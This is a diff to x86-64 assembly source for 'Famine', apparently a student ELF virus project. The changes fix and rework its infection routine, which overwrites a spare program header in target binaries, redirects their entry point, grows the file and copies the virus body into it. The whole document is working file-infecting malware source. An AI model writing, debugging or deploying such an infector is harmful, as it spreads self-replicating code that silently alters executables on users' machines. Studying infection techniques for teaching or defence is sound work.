@@ -603,15 +603,19 @@ prepare_infection:
 	cmp     rax, 0
 	jl     .close_file
 
+	; save file size
+	mov     rax, [rsp + 48]
+	mov     [rel file_size], rax
+	add     rsp, 144    ; Fix: move this AFTER storing file_size
+
 	; mmap(0, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)
-	mov     rsi, [rsp + 48]
-	add rsp, 144
 	mov     rax, SYS_mmap
-	mov     rdi, 0
+	xor     rdi, rdi    ; NULL address (let kernel choose)
+	mov     rsi, [rel file_size]  ; Fix: Load the VALUE from file_size
 	mov     rdx, PROT_READ | PROT_WRITE
 	mov     r10, MAP_SHARED
-	mov     r8, r12
-	mov     r9, 0
+	mov     r8, r12     ; file descriptor
+	xor     r9, r9      ; offset
 	syscall
 	cmp     rax, -4095
 	jae     .close_file
@@ -656,141 +660,162 @@ prepare_infection:
 		POP_ALL
 		ret
 
-;movzx	rcx, e_phnum
-;movzx	rdi, e_phentisize
 infection:
-    PUSH_ALLr
+	PUSH_ALLr
 
-    mov BYTE [rel zero], 1
-    mov qword [rel p_offset], 0
-    mov qword [rel p_vaddr], 0
-    mov qword [rel p_paddr], 0
+	mov BYTE [rel zero], 1
+	mov qword [rel p_offset], 0
+	mov qword [rel p_vaddr], 0
+	mov qword [rel p_paddr], 0
 
-    mov r10, [r14 + ehdr.e_phoff] ; program header table offset
-    movzx rcx, word [r14 + ehdr.e_phnum] ; number of entries
-    movzx rdi, word [r14 + ehdr.e_phentsize] ; entry size
+	mov r10, [r14 + ehdr.e_phoff]
+	movzx rcx, word [r14 + ehdr.e_phnum]
+	movzx rdi, word [r14 + ehdr.e_phentsize]
 
-    xor r15, r15
-    xor r11, r11
-    xor r8, r8 ; program header index
-    mov r13, 1
+	xor r15, r15
+	xor r11, r11
+	xor r8, r8
+	mov r13, 1
 
 .loop:
-    push r11
-    push rcx
+	push r11
+	push rcx
 
-    mov rax, r8
-    mul rdi
-    add rax, r10
-    lea rbx, [r14 + rax] ; rbx = current program header
+	mov rax, r8
+	mul rdi
+	add rax, r10
+	lea rbx, [r14 + rax]
 
-    pop rcx
-    pop r11
-    inc r8
+	pop rcx
+	pop r11
+	inc r8
 
-    cmp dword [rbx], 1 ; PT_LOAD
-    jne .no_load
+	cmp dword [rbx], 1
+	jne .no_load
 
-    mov rax, [rbx + phdr.p_filesz] ; p_filesz
-    add rax, [rbx + phdr.p_offset] ; + p_offset
-    cmp rax, [rel p_offset]
-    jb .no_above
-    mov [rel p_offset], rax
+	mov rax, [rbx + phdr.p_filesz]
+	add rax, [rbx + phdr.p_offset]
+	cmp rax, [rel p_offset]
+	jb .no_above
+	mov [rel p_offset], rax
 
 .no_above_offset:
-    mov rax, [rbx + phdr.p_vaddr] ; p_vaddr
-    add rax, [rbx + phdr.p_memsz] ; + p_memsz
-    cmp rax, [rel p_vaddr]
-    jb .no_above
-    mov [rel p_vaddr], rax
+	mov rax, [rbx + phdr.p_vaddr]
+	add rax, [rbx + phdr.p_memsz]
+	cmp rax, [rel p_vaddr]
+	jb .no_above
+	mov [rel p_vaddr], rax
 
 .no_above:
-    cmp dword [rbx + phdr.p_flags], 6 ; PF_R | PF_W
-    jnle .no_load
-    mov r15, [rbx + phdr.p_vaddr]
-    sub r15, [rbx + phdr.p_offset] ; r15 = p_vaddr - p_offset
+	cmp dword [rbx + phdr.p_flags], 6
+	jnle .no_load
+	mov r15, [rbx + phdr.p_vaddr]
+	sub r15, [rbx + phdr.p_offset]
 
 .no_load:
-    cmp dword [rbx], 0 ; PT_NULL
-    je .useless_ph
-    cmp dword [rbx], 4 ; PT_NOTE
-    je .useless_ph
-    cmp dword [rbx], 5 ; PT_SHLIB
-    je .useless_ph
-    jmp .not_useless_ph
+	cmp dword [rbx], 0
+	je .useless_ph
+	cmp dword [rbx], 4
+	je .useless_ph
+	cmp dword [rbx], 5
+	je .useless_ph
+	jmp .not_useless_ph
 
 .useless_ph:
-    mov rax, r8
-    dec rax
-    mul rdi
-    add rax, r10
-    mov r11, rax
-    xor r13, r13
+	mov rax, r8
+	dec rax
+	mul rdi
+	add rax, r10
+	mov r11, rax
+	xor r13, r13
 
 .not_useless_ph:
-    dec rcx
-    jnz .loop
+	dec rcx
+	jnz .loop
 
+	cmp r13, 1
+	mov rax, [rel p_vaddr]
+	mov rdx, [rel p_offset]
+	call align_value
 
-	cmp		r13, 1
-	mov		rax, [rel p_vaddr]
-	;add		rax, [rel elfb + ehdr.e_shoff]
-	;add		rax, r15	-> Tant que ca crash pas on add pas!
+	mov [rel p_vaddr], rax
+	mov [rel entry], rax
+	mov [rel p_paddr], rax
 
+	lea rsi, [r14 + r11]
 
-	mov		rdx, [rel p_offset]
+	push rdi
+	push rcx
+	mov rdi, rsi
+	lea rsi, [rel new_programheader]
+	mov rcx, 56
+	rep movsb
+	pop rcx
+	pop rdi
 
-	call	align_value
+	mov rax, [rel p_vaddr]
+	mov [r14 + ehdr.e_entry], rax
 
-	mov		[rel p_vaddr], rax
-	mov		[rel entry], rax
-	mov		[rel p_paddr], rax
+	mov byte [r14 + 0xa], 1
 
-	sub		r11, 56;
+	mov rax, [rel p_offset]
+	add rax, FAMINE_SIZE_NO_BSS
+	cmp rax, [rel file_size]
+	jbe .no_extend
 
-	mov		rax, SYS_pwrite64
-	mov		rdi, r12
-	lea		rsi, [rel new_programheader]
-	mov		rdx, 56
-	mov		r10, r11
-	syscall
-	;  LOAD           0x0000000000024770 0x0000000000026770 0x0000000000026770
-	; New Entry
-	mov		rax, SYS_pwrite64
-	mov		rdi, r12
-	lea		rsi, [rel p_vaddr]
-	mov		rdx, 8
-	mov		r10, ehdr.e_entry
-	syscall
-
-
-	mov		rax, SYS_pwrite64
-	mov		rdi, r12
-	lea		rsi, [rel one]
-	mov		rdx, 1
-	mov		r10, 0xa
+	mov rax, SYS_munmap
+	mov rdi, r14
+	mov rsi, [rel file_size]
 	syscall
 
-	; write famine
-
-	; 15952 ->21088
-	lea		rsi, [rel _start]
-	mov		rdx, FAMINE_SIZE_NO_BSS
-	mov		r10, [rel p_offset]
-	mov		rdi, r12
-	mov		rax, SYS_pwrite64
+	mov rax, SYS_ftruncate
+	mov rdi, r12
+	mov rsi, [rel p_offset]
+	add rsi, FAMINE_SIZE_NO_BSS
+	mov [rel file_size], rsi
 	syscall
 
+	mov rax, SYS_mmap
+	xor rdi, rdi
+	mov rsi, [rel file_size]
+	mov rdx, PROT_READ | PROT_WRITE
+	mov r10, MAP_SHARED
+	mov r8, r12
+	xor r9, r9
+	syscall
+	mov r14, rax
 
-	.return:
-		mov		rax, r13
-		POP_ALLr
-		ret
+.no_extend:
+	push rdi
+	push rsi
+	push rcx
+	mov rdi, r14
+	add rdi, [rel p_offset]
+	lea rsi, [rel _start]
+	mov rcx, FAMINE_SIZE_NO_BSS
+	rep movsb
+	pop rcx
+	pop rsi
+	pop rdi
 
+	mov rax, SYS_msync
+	mov rdi, r14
+	mov rsi, [rel file_size]
+	mov rdx, MS_SYNC
+	syscall
+
+	mov rax, SYS_munmap
+	mov rdi, r14
+	mov rsi, [rel file_size]
+	syscall
+
+.return:
+	mov rax, r13
+	POP_ALLr
+	ret
 
 
 end_:
-
 	call	famine
 
 	mov		rax, SYS_open
@@ -903,7 +928,7 @@ end_:
 _stop:
 ; -----
 
-
+	file_size dq 0
 	file	db 'elf64 found!', 0
 	signature	db 'Famine version 1.0 (c)oded by alexafer-jdecorte', 0
 	old_entry		   dq 0
